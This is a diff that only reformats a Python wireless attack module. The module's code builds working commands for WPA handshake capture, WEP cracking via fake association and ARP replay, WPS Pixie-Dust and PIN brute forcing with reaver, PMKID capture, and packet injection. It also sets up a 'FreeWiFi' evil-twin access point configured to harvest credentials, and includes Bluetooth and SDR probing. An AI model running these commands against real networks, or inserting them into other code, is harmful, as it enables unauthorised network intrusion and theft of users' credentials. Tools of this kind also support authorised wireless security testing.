@@ -120,12 +120,14 @@ class WirelessModule:
                         essid = parts[13].strip()
                         enc = parts[5].strip() if len(parts) > 5 else ""
                         if bssid and essid:
-                            self.found_networks.append({
-                                "bssid": bssid,
-                                "power": power,
-                                "essid": essid,
-                                "encryption": enc,
-                            })
+                            self.found_networks.append(
+                                {
+                                    "bssid": bssid,
+                                    "power": power,
+                                    "essid": essid,
+                                    "encryption": enc,
+                                }
+                            )
         except Exception:
             pass
 
@@ -160,16 +162,14 @@ class WirelessModule:
         self.log(f"Capturing WPA handshake from {bssid} ch{channel}", "warning")
         self.is_running = True
         import platform
+
         if platform.system() == "Darwin":
             self.run_command(f"airport --channel={channel}")
         else:
             self.run_command(f"iwconfig {interface} channel {channel}")
 
         prefix = self._tmp("wpa_hs")
-        cap_cmd = (
-            f"airodump-ng -c {channel} --bssid {bssid} "
-            f"-w {prefix} {interface}"
-        )
+        cap_cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {prefix} {interface}"
         self.run_background(cap_cmd)
         time.sleep(3)
 
@@ -178,8 +178,8 @@ class WirelessModule:
         time.sleep(15)
 
         cap_file = f"{prefix}-01.cap"
-        self.run_command(f"killall airodump-ng 2>/dev/null")
-        self.run_command(f"killall aireplay-ng 2>/dev/null")
+        self.run_command("killall airodump-ng 2>/dev/null")
+        self.run_command("killall aireplay-ng 2>/dev/null")
 
         success = os.path.isfile(cap_file)
         self.results["wpa_handshake"] = {
@@ -237,28 +237,22 @@ class WirelessModule:
         self.log(f"Starting WEP attack on {bssid} ch{channel}", "warning")
         self.is_running = True
         import platform
+
         if platform.system() == "Darwin":
             self.run_command(f"airport --channel={channel}")
         else:
             self.run_command(f"iwconfig {interface} channel {channel}")
 
         prefix = self._tmp("wep_cap")
-        cap_cmd = (
-            f"airodump-ng -c {channel} --bssid {bssid} "
-            f"-w {prefix} {interface}"
-        )
+        cap_cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {prefix} {interface}"
         self.run_background(cap_cmd)
         time.sleep(3)
 
-        fake_assoc_cmd = (
-            f"aireplay-ng -1 0 -a {bssid} {interface}"
-        )
+        fake_assoc_cmd = f"aireplay-ng -1 0 -a {bssid} {interface}"
         self.run_background(fake_assoc_cmd)
         time.sleep(2)
 
-        arp_cmd = (
-            f"aireplay-ng -3 -b {bssid} {interface}"
-        )
+        arp_cmd = f"aireplay-ng -3 -b {bssid} {interface}"
         self.run_background(arp_cmd)
 
         crack_file = f"{prefix}-01.cap"
@@ -267,9 +261,7 @@ class WirelessModule:
             time.sleep(5)
             if not self.is_running:
                 break
-            test = self.run_command(
-                f"aircrack-ng {crack_file} 2>/dev/null | grep 'KEY FOUND'", timeout=10
-            )
+            test = self.run_command(f"aircrack-ng {crack_file} 2>/dev/null | grep 'KEY FOUND'", timeout=10)
             if test and "KEY FOUND" in test:
                 crack_result = test
                 break
@@ -305,9 +297,7 @@ class WirelessModule:
         """WPS Pixie-Dust offline brute-force attack via reaver / pixiewps."""
         self.log(f"Starting WPS Pixie-Dust attack on {target}", "warning")
         self.is_running = True
-        pixie_cmd = (
-            f"reaver -i wlan0mon -b {target} -vv -K 1 -n -N -D -R"
-        )
+        pixie_cmd = f"reaver -i wlan0mon -b {target} -vv -K 1 -n -N -D -R"
         try:
             result = self.run_command(pixie_cmd, timeout=1800)
             pin = None
@@ -343,9 +333,7 @@ class WirelessModule:
         """WPS PIN brute force attack using reaver."""
         self.log(f"Starting WPS PIN brute force on {target}", "warning")
         self.is_running = True
-        cmd = (
-            f"reaver -i wlan0mon -b {target} -vv -p 12345670 -N -D -R"
-        )
+        cmd = f"reaver -i wlan0mon -b {target} -vv -p 12345670 -N -D -R"
         try:
             result = self.run_command(cmd, timeout=7200)
             pin = None
@@ -386,10 +374,7 @@ class WirelessModule:
         self.log(f"Starting PMKID attack on {target}", "warning")
         self.is_running = True
         pcap = self._tmp("pmkid.pcap")
-        cmd_capture = (
-            f"hcxdumptool -i wlan0mon -o {pcap} "
-            f"--filterlist={target} --filtermode=2"
-        )
+        cmd_capture = f"hcxdumptool -i wlan0mon -o {pcap} --filterlist={target} --filtermode=2"
         try:
             self.run_command(cmd_capture, timeout=120)
         except Exception as e:
@@ -456,13 +441,7 @@ class WirelessModule:
         hostapd_bin = "hostapd-mana"
         with open(cfg, "w") as fh:
             fh.write(
-                f"interface={interface}\n"
-                f"driver=nl80211\n"
-                f"ssid=FreeWiFi\n"
-                f"channel=6\n"
-                f"hw_mode=g\n"
-                f"mana=1\n"
-                f"mana_creds=1\n"
+                f"interface={interface}\ndriver=nl80211\nssid=FreeWiFi\nchannel=6\nhw_mode=g\nmana=1\nmana_creds=1\n"
             )
         cmd = f"{hostapd_bin} {cfg}"
         self.run_background(cmd)
@@ -487,13 +466,13 @@ class WirelessModule:
             for line in result.strip().split("\n")[1:]:
                 parts = line.strip().split("\t")
                 if len(parts) >= 2:
-                    devices.append({
-                        "address": parts[0].strip(),
-                        "name": parts[1].strip(),
-                    })
-        self.found_networks.extend(
-            [{"type": "bluetooth", **d} for d in devices]
-        )
+                    devices.append(
+                        {
+                            "address": parts[0].strip(),
+                            "name": parts[1].strip(),
+                        }
+                    )
+        self.found_networks.extend([{"type": "bluetooth", **d} for d in devices])
         self.results["bluetooth_scan"] = {
             "devices": devices,
             "count": len(devices),
@@ -544,7 +523,7 @@ class WirelessModule:
         obex_out = self.run_command(obex_cmd, timeout=15)
         results["obex_attempt"] = obex_out
 
-        crack_cmd = f"btscanner -i hci0 -n 2>&1"
+        crack_cmd = "btscanner -i hci0 -n 2>&1"
         bt_out = self.run_command(crack_cmd, timeout=15)
         results["btscanner"] = bt_out
 
@@ -626,19 +605,14 @@ class WirelessModule:
         self.log(f"SDR attack at {frequency} MHz", "warning")
         self.is_running = True
         capture_file = self._tmp(f"sdr_{frequency}mhz.raw")
-        cmd = (
-            f"rtl_sdr -f {int(frequency * 1e6)} "
-            f"-s 2048000 {capture_file}"
-        )
+        cmd = f"rtl_sdr -f {int(frequency * 1e6)} -s 2048000 {capture_file}"
         try:
             self.run_command(cmd, timeout=30)
         except Exception:
             pass
 
         size = os.path.getsize(capture_file) if os.path.isfile(capture_file) else 0
-        decode_cmd = (
-            f"rtl_433 -r {capture_file} 2>&1 | head -30"
-        )
+        decode_cmd = f"rtl_433 -r {capture_file} 2>&1 | head -30"
         decoded = self.run_command(decode_cmd, timeout=15)
 
         self.results["sdr_attack"] = {
@@ -665,10 +639,7 @@ class WirelessModule:
         self.log(f"Starting WiFi site survey on {interface}", "info")
         self.is_running = True
         prefix = self._tmp("survey")
-        cmd = (
-            f"airodump-ng {interface} --write {prefix} "
-            f"--output-format csv"
-        )
+        cmd = f"airodump-ng {interface} --write {prefix} --output-format csv"
         try:
             self.run_command(cmd, timeout=60)
         except Exception:
@@ -698,23 +669,27 @@ class WirelessModule:
                     power = parts[8]
                     name = parts[13]
                     if bssid and bssid != "BSSID":
-                        aps.append({
-                            "bssid": bssid,
-                            "channel": channel,
-                            "power": power,
-                            "speed": speed,
-                            "privacy": privacy,
-                            "cipher": cipher,
-                            "auth": auth,
-                            "ssid": name,
-                        })
+                        aps.append(
+                            {
+                                "bssid": bssid,
+                                "channel": channel,
+                                "power": power,
+                                "speed": speed,
+                                "privacy": privacy,
+                                "cipher": cipher,
+                                "auth": auth,
+                                "ssid": name,
+                            }
+                        )
                 elif section == "client" and len(parts) >= 6:
                     mac = parts[0]
                     if mac and mac != "Station MAC":
-                        clients.append({
-                            "mac": mac,
-                            "probe": parts[5] if len(parts) > 5 else "",
-                        })
+                        clients.append(
+                            {
+                                "mac": mac,
+                                "probe": parts[5] if len(parts) > 5 else "",
+                            }
+                        )
 
         self.results["site_survey"] = {
             "access_points": aps,
@@ -741,6 +716,7 @@ class WirelessModule:
         try:
             while time.time() - start < duration and self.is_running:
                 import platform
+
                 if platform.system() == "Darwin":
                     self.run_command(f"airport --channel={ch}")
                 else:
@@ -772,16 +748,14 @@ class WirelessModule:
         injected = 0
         try:
             from scapy.all import Dot11, Dot11ProbeReq, RadioTap, sendp, conf
+
             conf.iface = "wlan0mon"
             dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target)
             pkt = RadioTap() / dot11 / Dot11ProbeReq()
             sendp(pkt, count=count, inter=0.05, verbose=False)
             injected = count
         except ImportError:
-            cmd = (
-                f"aireplay-ng --inject -n {count} "
-                f"--dst {target} wlan0mon"
-            )
+            cmd = f"aireplay-ng --inject -n {count} --dst {target} wlan0mon"
             self.run_command(cmd, timeout=60)
             injected = count
         except Exception as e:
@@ -807,10 +781,7 @@ class WirelessModule:
         self.log(f"Starting fragmentation attack on {target}", "warning")
         self.is_running = True
         prga_file = self._tmp("frag.xor")
-        cmd = (
-            f"aireplay-ng -5 -b {target} -h 00:11:22:33:44:55 "
-            f"wlan0mon"
-        )
+        cmd = f"aireplay-ng -5 -b {target} -h 00:11:22:33:44:55 wlan0mon"
         try:
             result = self.run_command(cmd, timeout=300)
             success = result is not None and "got PRGA" in (result or "")
@@ -884,11 +855,7 @@ class WirelessModule:
             "summary": {
                 "networks_scanned": len(self.found_networks),
                 "attacks_attempted": len(self.results),
-                "successful": sum(
-                    1
-                    for v in self.results.values()
-                    if isinstance(v, dict) and v.get("success")
-                ),
+                "successful": sum(1 for v in self.results.values() if isinstance(v, dict) and v.get("success")),
             },
             "networks_found": self.found_networks,
             "detailed_results": self.results,
